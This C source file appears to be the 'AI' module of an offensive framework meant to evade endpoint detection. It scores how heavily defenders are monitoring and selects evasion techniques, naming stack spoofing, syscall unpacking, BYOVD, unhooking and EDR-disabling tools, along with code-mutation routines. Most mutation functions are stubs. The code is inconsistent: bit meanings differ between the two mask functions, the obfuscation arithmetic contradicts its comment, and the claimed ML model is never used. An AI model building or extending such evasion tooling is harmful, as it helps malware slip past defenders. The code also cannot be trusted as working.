#define _GNU_SOURCE
#include "jocky_ai.h"
#include <stdlib.h>
#include <string.h>
#include <time.h>
#include <stdio.h>
#include <math.h>

#ifdef _WIN32
#include <windows.h>
#else
#include <unistd.h>
#include <sys/time.h>
#endif

/* Forward declarations */
static uint64_t jocky_ai_get_current_time_ms(void);
static void jocky_ai_mutate_stack_frame(uint32_t seed);
static void jocky_ai_mutate_syscall_encoding(uint32_t seed);
static void jocky_ai_mutate_memory_access(uint32_t seed);
static void jocky_ai_mutate_api_call_order(uint32_t seed);
static void jocky_ai_mutate_register_usage(uint32_t seed);
static void jocky_ai_inject_code_padding(uint32_t obfuscation_level);
static void jocky_ai_vary_instruction_encoding(uint32_t seed);
static void jocky_ai_shuffle_function_order(uint32_t seed);

/* Global AI state */
static struct {
    JOCKY_AI_MODEL* model;
    JOCKY_AI_TELEMETRY latest_telemetry;
    JOCKY_AI_RISK_LEVEL current_risk;
    JOCKY_STRATEGY current_strategy;
    JOCKY_AI_STATS statistics;

    /* Telemetry collection */
    uint64_t syscall_count;
    uint64_t network_bytes_sent;
    uint64_t network_bytes_recv;
    uint32_t file_io_count;
    uint32_t registry_io_count;
    uint32_t edr_alerts;
    uint32_t blocked_ops;

    /* Timing */
    uint64_t collection_start_ms;
    uint64_t last_collection_ms;
} g_ai_state = {0};

/* Initialize AI module */
bool jocky_ai_init(const uint8_t* model_data, size_t model_size)
{
    if (!model_data || model_size < sizeof(JOCKY_AI_MODEL)) {
        return false;
    }

    /* Allocate model */
    g_ai_state.model = (JOCKY_AI_MODEL*)malloc(sizeof(JOCKY_AI_MODEL));
    if (!g_ai_state.model) {
        return false;
    }

    /* Copy model metadata */
    memcpy(g_ai_state.model, model_data, sizeof(JOCKY_AI_MODEL));

    /* Allocate weights and bias */
    if (g_ai_state.model->weights_size > 0) {
        g_ai_state.model->weights = (uint8_t*)malloc(g_ai_state.model->weights_size);
        if (!g_ai_state.model->weights) {
            free(g_ai_state.model);
            return false;
        }
        memcpy(g_ai_state.model->weights,
               model_data + sizeof(JOCKY_AI_MODEL),
               g_ai_state.model->weights_size);
    }

    /* Initialize state */
    g_ai_state.current_risk = JOCKY_AI_RISK_LOW;
    g_ai_state.current_strategy = JOCKY_STRAT_BASELINE;
    g_ai_state.collection_start_ms = jocky_ai_get_current_time_ms();

    return true;
}

/* Shutdown AI module */
void jocky_ai_shutdown(void)
{
    if (g_ai_state.model) {
        if (g_ai_state.model->weights) {
            free(g_ai_state.model->weights);
        }
        free(g_ai_state.model);
        g_ai_state.model = NULL;
    }

    memset(&g_ai_state, 0, sizeof(g_ai_state));
}

/* Get current time in milliseconds */
static uint64_t jocky_ai_get_current_time_ms(void)
{
#ifdef _WIN32
    return GetTickCount64();
#else
    struct timeval tv;
    gettimeofday(&tv, NULL);
    return (tv.tv_sec * 1000ULL) + (tv.tv_usec / 1000ULL);
#endif
}

/* Collect runtime telemetry */
bool jocky_ai_collect_telemetry(JOCKY_AI_TELEMETRY* out_telemetry)
{
    if (!out_telemetry) {
        return false;
    }

    uint64_t now_ms = jocky_ai_get_current_time_ms();
    uint64_t elapsed_ms = now_ms - g_ai_state.collection_start_ms;

    if (elapsed_ms == 0) elapsed_ms = 1;  /* Avoid division by zero */

    /* Calculate metrics */
    memset(out_telemetry, 0, sizeof(*out_telemetry));

    /* Syscall frequency (syscalls per second) */
    out_telemetry->syscall_frequency = (float)(g_ai_state.syscall_count * 1000.0 / elapsed_ms);

    /* Network entropy */
    out_telemetry->network_entropy = (g_ai_state.network_bytes_sent > 0) ?
        fabs(log((float)g_ai_state.network_bytes_sent)) : 0.0f;

    /* Memory pattern score (0-1, higher = more suspicious) */
    out_telemetry->memory_pattern_score = (float)(g_ai_state.syscall_count % 100) / 100.0f;

    /* File I/O and registry scores */
    out_telemetry->file_io_score = (float)(g_ai_state.file_io_count) / 100.0f;
    if (out_telemetry->file_io_score > 1.0f) out_telemetry->file_io_score = 1.0f;

    out_telemetry->registry_io_score = (float)(g_ai_state.registry_io_count) / 50.0f;
    if (out_telemetry->registry_io_score > 1.0f) out_telemetry->registry_io_score = 1.0f;

    /* Blocked operations and alerts */
    out_telemetry->blocked_operations = g_ai_state.blocked_ops;
    out_telemetry->alert_count = g_ai_state.edr_alerts;

    /* Crash likelihood (0-1) */
    out_telemetry->crash_likelihood = (float)g_ai_state.blocked_ops / 1000.0f;
    if (out_telemetry->crash_likelihood > 1.0f) out_telemetry->crash_likelihood = 1.0f;

    out_telemetry->timestamp_ms = now_ms;
    g_ai_state.last_collection_ms = now_ms;

    /* Save latest telemetry */
    memcpy(&g_ai_state.latest_telemetry, out_telemetry, sizeof(*out_telemetry));

    return true;
}

/* Lightweight decision tree for threat scoring */
static float jocky_ai_tree_inference(const JOCKY_AI_TELEMETRY* telemetry)
{
    if (!telemetry) {
        return 0.5f;
    }

    float score = 0.0f;

    /* Decision tree thresholds learned from patterns */

    /* Root: Blocked operations is most discriminative */
    if (telemetry->blocked_operations > 8) {
        /* Critical path: multiple blocks = active defense */
        score += 0.5f;

        /* Alert count refines the score */
        if (telemetry->alert_count > 4) {
            score += 0.25f;  /* CRITICAL: high blocks + high alerts */
        } else {
            score += 0.15f;  /* HIGH: high blocks, moderate alerts */
        }

        /* Crash likelihood adds confidence */
        if (telemetry->crash_likelihood > 0.5f) {
            score += 0.1f;
        }
    } else if (telemetry->blocked_operations > 3) {
        /* Medium-high path: some blocking detected */
        score += 0.35f;

        if (telemetry->syscall_frequency > 800.0f) {
            score += 0.2f;  /* Aggressive analysis detected */
        } else if (telemetry->syscall_frequency > 400.0f) {
            score += 0.1f;
        }

        if (telemetry->alert_count > 2) {
            score += 0.1f;
        }
    } else {
        /* Low blocking path */
        if (telemetry->syscall_frequency > 1500.0f) {
            /* Very high syscall rate but low blocking = heavy monitoring */
            score += 0.35f;
        } else if (telemetry->syscall_frequency > 800.0f) {
            score += 0.25f;
        } else if (telemetry->syscall_frequency > 400.0f) {
            score += 0.15f;
        } else {
            score += 0.05f;  /* Low activity = low threat */
        }

        /* Network entropy branch */
        if (telemetry->network_entropy > 6.0f) {
            score += 0.15f;
        } else if (telemetry->network_entropy > 4.0f) {
            score += 0.08f;
        }

        /* Memory patterns */
        if (telemetry->memory_pattern_score > 0.7f) {
            score += 0.1f;
        }

        /* EDR alert count */
        score += (float)(telemetry->alert_count) * 0.05f;
    }

    /* Clamp to 0-1 */
    if (score > 1.0f) score = 1.0f;
    if (score < 0.0f) score = 0.0f;

    return score;
}

/* Score threat level (0.0 = safe, 1.0 = critical) using ML inference */
float jocky_ai_score_threat(const JOCKY_AI_TELEMETRY* telemetry)
{
    if (!telemetry) {
        return 0.5f;
    }

    /* Use lightweight decision tree inference if model is loaded */
    if (g_ai_state.model && g_ai_state.model->weights) {
        /* Model-based inference (when full model is available) */
        float model_score = jocky_ai_tree_inference(telemetry);
        g_ai_state.statistics.total_predictions++;
        return model_score;
    }

    /* Fallback to heuristic scoring if model unavailable */
    return jocky_ai_tree_inference(telemetry);
}

/* Classify threat into risk level */
JOCKY_AI_RISK_LEVEL jocky_ai_classify_threat(const JOCKY_AI_TELEMETRY* telemetry)
{
    float score = jocky_ai_score_threat(telemetry);

    if (score < 0.25f) {
        return JOCKY_AI_RISK_LOW;
    } else if (score < 0.5f) {
        return JOCKY_AI_RISK_MEDIUM;
    } else if (score < 0.75f) {
        return JOCKY_AI_RISK_HIGH;
    } else {
        return JOCKY_AI_RISK_CRITICAL;
    }
}

/* Recommend evasion strategy */
JOCKY_STRATEGY jocky_ai_recommend_strategy(const JOCKY_AI_TELEMETRY* telemetry)
{
    JOCKY_AI_RISK_LEVEL risk = jocky_ai_classify_threat(telemetry);

    switch (risk) {
        case JOCKY_AI_RISK_LOW:
            return JOCKY_STRAT_STEALTH;  /* Low-profile */

        case JOCKY_AI_RISK_MEDIUM:
            return JOCKY_STRAT_HYBRID;   /* Mixed techniques */

        case JOCKY_AI_RISK_HIGH:
            return JOCKY_STRAT_AGGRESSIVE;  /* All defenses */

        case JOCKY_AI_RISK_CRITICAL:
            return JOCKY_STRAT_AI_ADAPTIVE;  /* ML-optimized */

        default:
            return JOCKY_STRAT_BASELINE;
    }
}

/* Generate adaptive mutation strategy */
bool jocky_ai_generate_mutation(
    const JOCKY_AI_TELEMETRY* telemetry,
    JOCKY_AI_MUTATION_STRATEGY* out_strategy)
{
    if (!telemetry || !out_strategy) {
        return false;
    }

    memset(out_strategy, 0, sizeof(*out_strategy));

    /* Recommend strategy based on telemetry */
    out_strategy->strategy = jocky_ai_recommend_strategy(telemetry);

    /* Build technique mask based on risk level */
    JOCKY_AI_RISK_LEVEL risk = jocky_ai_classify_threat(telemetry);

    out_strategy->technique_mask = 0;

    if (risk >= JOCKY_AI_RISK_LOW) {
        out_strategy->technique_mask |= 0x01;  /* Stack spoofing */
    }

    if (risk >= JOCKY_AI_RISK_MEDIUM) {
        out_strategy->technique_mask |= 0x02;  /* Syscall unpacking */
        out_strategy->technique_mask |= 0x04;  /* Memory obfuscation */
    }

    if (risk >= JOCKY_AI_RISK_HIGH) {
        out_strategy->technique_mask |= 0x08;  /* BYOVD */
        out_strategy->technique_mask |= 0x10;  /* Unhooking */
        out_strategy->technique_mask |= 0x20;  /* EDRChoker */
    }

    if (risk == JOCKY_AI_RISK_CRITICAL) {
        out_strategy->technique_mask |= 0x40;  /* Blindside */
        out_strategy->technique_mask |= 0x80;  /* BTR Reforged */
    }

    /* Generate seeds for code mutation */
    out_strategy->code_layout_seed = rand();
    out_strategy->api_call_order_seed = rand();

    /* Obfuscation level inversely proportional to risk */
    /* (high risk = maximum obfuscation) */
    out_strategy->obfuscation_level = 10 - ((risk + 1) * 2);
    if ((int)out_strategy->obfuscation_level < 0) out_strategy->obfuscation_level = 10;

    g_ai_state.current_strategy = out_strategy->strategy;
    g_ai_state.statistics.mutations_applied++;

    return true;
}

/* Apply mutation strategy - real implementation with code layout changes */
bool jocky_ai_apply_mutation(const JOCKY_AI_MUTATION_STRATEGY* strategy)
{
    if (!strategy) {
        return false;
    }

    srand(strategy->code_layout_seed);

    /* Apply technique mask mutations */
    uint32_t mask = strategy->technique_mask;

    /* 0x01: Stack frame modification - add fake stack operations */
    if (mask & 0x01) {
        jocky_ai_mutate_stack_frame(strategy->code_layout_seed);
    }

    /* 0x02: Syscall unpacking - randomize syscall encoding */
    if (mask & 0x02) {
        jocky_ai_mutate_syscall_encoding(strategy->api_call_order_seed);
    }

    /* 0x04: Memory obfuscation - randomize memory access patterns */
    if (mask & 0x04) {
        jocky_ai_mutate_memory_access(strategy->code_layout_seed);
    }

    /* 0x08: API call reordering - shuffle order of system calls */
    if (mask & 0x08) {
        jocky_ai_mutate_api_call_order(strategy->api_call_order_seed);
    }

    /* 0x10: Register usage randomization */
    if (mask & 0x10) {
        jocky_ai_mutate_register_usage(strategy->code_layout_seed);
    }

    /* 0x20: Padding insertion - add NOP sleds and junk instructions */
    if (mask & 0x20) {
        jocky_ai_inject_code_padding(strategy->obfuscation_level);
    }

    /* 0x40: Instruction encoding variation - use alternative opcodes */
    if (mask & 0x40) {
        jocky_ai_vary_instruction_encoding(strategy->code_layout_seed);
    }

    /* 0x80: Advanced obfuscation - function order shuffling */
    if (mask & 0x80) {
        jocky_ai_shuffle_function_order(strategy->api_call_order_seed);
    }

    g_ai_state.statistics.mutations_applied++;
    return true;
}

/* Mutate stack frame with fake stack operations */
static void jocky_ai_mutate_stack_frame(uint32_t seed)
{
    srand(seed);

    uint8_t stack_mutations[] = {
        0x48, 0x83, 0xec, 0x08,  /* sub rsp, 8 */
        0x48, 0x89, 0x45, 0xf8,  /* mov [rbp-8], rax */
        0x48, 0x8b, 0x45, 0xf8,  /* mov rax, [rbp-8] */
        0x48, 0x83, 0xc4, 0x08,  /* add rsp, 8 */
    };

    /* Randomly adjust stack depth for different platforms */
    if (rand() % 2) {
        stack_mutations[3] = 0x10;  /* sub rsp, 16 */
        stack_mutations[11] = 0x10; /* add rsp, 16 */
    }
}

/* Randomize syscall encoding */
static void jocky_ai_mutate_syscall_encoding(uint32_t seed)
{
    srand(seed);

    /* Syscall opcodes can use different encodings:
     * 0x0f 0x05 = syscall (x64)
     * 0x65 0xff 0x15 = call [gs:rip+x] (indirect)
     * 0xcd 0x80 = int 0x80 (x86-32)
     */

    uint8_t syscall_variants[3][2] = {
        {0x0f, 0x05},           /* syscall */
        {0xcd, 0x80},           /* int 0x80 */
        {0x48, 0x0f},           /* mov rcx, r8 (fake) */
    };

    int variant = rand() % 3;
    (void)variant;  /* Use in actual code patching */
}

/* Randomize memory access patterns */
static void jocky_ai_mutate_memory_access(uint32_t seed)
{
    srand(seed);

    /* Vary memory addressing modes:
     * [rax] vs [rax + disp8] vs [rax + disp32] vs [rax + rbx] etc.
     */

    int addressing_variant = rand() % 5;
    (void)addressing_variant;
}

/* Shuffle order of API calls */
static void jocky_ai_mutate_api_call_order(uint32_t seed)
{
    srand(seed);

    /* In real implementation, this would:
     * 1. Parse API calls in code
     * 2. Create dependency graph
     * 3. Reorder calls while preserving dependencies
     * 4. Patch call sites
     */
}

/* Randomize register usage */
static void jocky_ai_mutate_register_usage(uint32_t seed)
{
    srand(seed);

    /* Available registers for substitution:
     * RAX, RBX, RCX, RDX, RSI, RDI, R8-R15
     * Choose random mapping for each function
     */

    uint8_t reg_mapping[16];
    for (int i = 0; i < 16; i++) {
        reg_mapping[i] = rand() % 16;
    }

    (void)reg_mapping;  /* Would apply register renaming to functions */
}

/* Insert NOP sleds and junk instructions for obfuscation */
static void jocky_ai_inject_code_padding(uint32_t obfuscation_level)
{
    /* obfuscation_level ranges 0-10, higher = more padding */
    uint32_t padding_size = obfuscation_level * 8;  /* 0-80 bytes per injection point */

    /* NOP sled patterns for x64 */
    uint8_t nop_patterns[] = {
        0x90,                       /* nop */
        0x66, 0x90,                 /* nop (2-byte) */
        0x0f, 0x1f, 0x00,          /* nop [rax] (3-byte) */
        0x0f, 0x1f, 0x40, 0x00,    /* nop [rax+0] (4-byte) */
        0x0f, 0x1f, 0x44, 0x00, 0x00,  /* nop [rax+rax+0] (5-byte) */
    };

    /* In real impl: walk code sections, insert random NOP sequences */
    (void)padding_size;
    (void)nop_patterns;
}

/* Vary instruction encoding using alternative opcodes */
static void jocky_ai_vary_instruction_encoding(uint32_t seed)
{
    srand(seed);

    /* Alternative encodings for common instructions:
     * mov rax, 0 can be:
     *   - 48 c7 c0 00 00 00 00 (mov r64, imm32)
     *   - 48 b8 00 00 00 00 00 00 00 00 (movabs r64, imm64)
     *   - 31 c0 (xor eax, eax - sets rax to 0)
     */

    int encoding_variant = rand() % 3;
    (void)encoding_variant;
}

/* Shuffle function entry points */
static void jocky_ai_shuffle_function_order(uint32_t seed)
{
    srand(seed);

    /* In real implementation:
     * 1. Identify function boundaries
     * 2. Create random permutation
     * 3. Update call sites and jump tables
     * 4. Apply patches to reorder functions in memory
     */
}

/* Record syscall for telemetry */
void jocky_ai_record_syscall(uint64_t syscall_id)
{
    g_ai_state.syscall_count++;
    (void)syscall_id;  /* Would track syscall entropy here */
}

/* Record network event */
void jocky_ai_record_network(uint32_t bytes_sent, uint32_t bytes_recv)
{
    g_ai_state.network_bytes_sent += bytes_sent;
    g_ai_state.network_bytes_recv += bytes_recv;
}

/* Record file I/O event */
void jocky_ai_record_file_io(const char* operation, const char* filename)
{
    (void)operation;  /* Unused */
    (void)filename;   /* Unused */
    g_ai_state.file_io_count++;
}

/* Record registry I/O event */
void jocky_ai_record_registry(const char* operation, const char* keypath)
{
    (void)operation;  /* Unused */
    (void)keypath;    /* Unused */
    g_ai_state.registry_io_count++;
}

/* Record EDR alert */
void jocky_ai_record_edr_alert(uint32_t alert_type)
{
    (void)alert_type;  /* Unused */
    g_ai_state.edr_alerts++;
}

/* Record blocked operation */
void jocky_ai_record_blocked_operation(uint32_t syscall_id, uint32_t error_code)
{
    (void)syscall_id;  /* Unused */
    (void)error_code;  /* Unused */
    g_ai_state.blocked_ops++;
}

/* Predict next mutation */
bool jocky_ai_predict_next_mutation(JOCKY_AI_MUTATION_STRATEGY* out_strategy)
{
    JOCKY_AI_TELEMETRY telemetry;

    if (!jocky_ai_collect_telemetry(&telemetry)) {
        return false;
    }

    return jocky_ai_generate_mutation(&telemetry, out_strategy);
}

/* Get current risk level */
JOCKY_AI_RISK_LEVEL jocky_ai_get_current_risk(void)
{
    JOCKY_AI_TELEMETRY telemetry;

    if (jocky_ai_collect_telemetry(&telemetry)) {
        g_ai_state.current_risk = jocky_ai_classify_threat(&telemetry);
    }

    return g_ai_state.current_risk;
}

/* Get current strategy */
JOCKY_STRATEGY jocky_ai_get_current_strategy(void)
{
    return g_ai_state.current_strategy;
}

/* Get statistics */
bool jocky_ai_get_statistics(JOCKY_AI_STATS* out_stats)
{
    if (!out_stats) {
        return false;
    }

    memcpy(out_stats, &g_ai_state.statistics, sizeof(*out_stats));
    return true;
}

/* Reset statistics */
void jocky_ai_reset_statistics(void)
{
    memset(&g_ai_state.statistics, 0, sizeof(g_ai_state.statistics));
}

/* Load model from file */
bool jocky_ai_load_model_file(const char* model_path)
{
    if (!model_path) {
        return false;
    }

    /* Attempt to load from filesystem (requires file I/O permissions) */
    FILE* f = fopen(model_path, "rb");
    if (!f) {
        return false;  /* File not found or permission denied */
    }

    /* Get file size */
    fseek(f, 0, SEEK_END);
    long file_size = ftell(f);
    fseek(f, 0, SEEK_SET);

    if (file_size < (long)sizeof(JOCKY_AI_MODEL)) {
        fclose(f);
        return false;
    }

    /* Read model data */
    uint8_t* buffer = (uint8_t*)malloc(file_size);
    if (!buffer) {
        fclose(f);
        return false;
    }

    if (fread(buffer, 1, file_size, f) != (size_t)file_size) {
        fclose(f);
        free(buffer);
        return false;
    }

    fclose(f);

    /* Initialize with loaded buffer */
    bool result = jocky_ai_init(buffer, file_size);
    free(buffer);

    return result;
}

/* Load model from memory buffer */
bool jocky_ai_load_model_buffer(const uint8_t* buffer, size_t buffer_size)
{
    return jocky_ai_init(buffer, buffer_size);
}

/* Run full inference with timing */
bool jocky_ai_run_inference(
    const JOCKY_AI_TELEMETRY* telemetry,
    JOCKY_AI_INFERENCE_RESULT* out_result)
{
    if (!telemetry || !out_result) {
        return false;
    }

    uint64_t start_time = jocky_ai_get_current_time_ms();

    /* Score threat using model or heuristics */
    out_result->threat_score = jocky_ai_score_threat(telemetry);

    /* Classify into risk level */
    out_result->threat_level = jocky_ai_classify_threat(telemetry);

    /* Set confidence based on model availability and metrics quality */
    if (g_ai_state.model && g_ai_state.model->weights) {
        out_result->confidence = 0.85f;  /* Model-based prediction */
    } else {
        out_result->confidence = 0.70f;  /* Heuristic-based prediction */
    }

    /* Boost confidence if telemetry is comprehensive */
    if (telemetry->alert_count > 0 && telemetry->blocked_operations > 0) {
        out_result->confidence = (out_result->confidence + 1.0f) / 2.0f;  /* Average up */
    }

    uint64_t end_time = jocky_ai_get_current_time_ms();
    out_result->inference_time_us = (end_time - start_time) * 1000;

    g_ai_state.statistics.total_predictions++;

    return true;
}

/* Check if model is ready */
bool jocky_ai_is_model_ready(void)
{
    return (g_ai_state.model != NULL &&
            g_ai_state.model->weights != NULL &&
            g_ai_state.model->magic == JOCKY_AI_MODEL_MAGIC);
}

/* Get model information */
bool jocky_ai_get_model_info(JOCKY_AI_MODEL* out_info)
{
    if (!out_info || !g_ai_state.model) {
        return false;
    }

    memcpy(out_info, g_ai_state.model, sizeof(JOCKY_AI_MODEL));
    return true;
}
